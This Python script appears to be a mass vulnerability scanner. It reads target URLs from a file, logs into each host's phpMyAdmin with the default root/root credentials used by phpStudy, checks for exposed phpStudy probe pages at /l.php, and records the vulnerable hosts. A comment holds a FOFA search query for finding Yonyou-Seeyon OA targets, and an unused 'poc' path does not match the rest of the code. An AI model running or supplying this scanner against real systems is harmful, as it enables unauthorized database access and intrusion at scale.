
import json
import requests

#fofa：app="Yonyou-Seeyon-OA" && body="致远协创A6" && host!="gov.cn"

urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "/phpmyadmin/index.php"
    vulnurl = url + payload
    post_data = {
        "pma_username": "root",
        "pma_password": "root",
        "server": "1",
        "target": "index.php"
    }
    try:
        sess = requests.Session()
        req = sess.post(vulnurl, data=post_data,  timeout=10, verify=False)
        req2 = sess.get(vulnurl, timeout=10, verify=False)
        if r"navigation.php" in req2.text and r"frame_navigation" in req.text:
            print("[+]存在phpstudy phpmyadmin默认密码漏洞...(高危)\tpayload: " + vulnurl + "\tpost: " + json.dumps(post_data,indent=4),"red")
            with open('phpmyadmin默认密码漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在phpstudy_phpmyadmin_defaultpwd漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/l.php"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl,  timeout=10, verify=False)
        if r"phpStudy" in req.text and r"php_version" in req.text:
            print("[+]存在phpstudy探针...(信息)\tpayload: " + vulnurl, "green")
            with open('信息泄露漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在phpstudy_probe漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")